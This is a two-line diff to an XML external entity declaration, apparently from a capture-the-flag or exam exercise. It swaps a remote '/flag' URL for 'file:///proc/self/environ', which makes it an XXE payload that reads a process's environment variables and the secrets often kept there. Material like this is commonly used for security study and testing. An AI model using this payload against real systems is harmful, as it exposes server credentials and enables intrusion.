@@ -1,1 +1,1 @@
-<!ENTITY file SYSTEM "https://mysql.gw34908723to.ext.exam.ns.agency/flag">
+<!ENTITY file SYSTEM "file:///proc/self/environ">
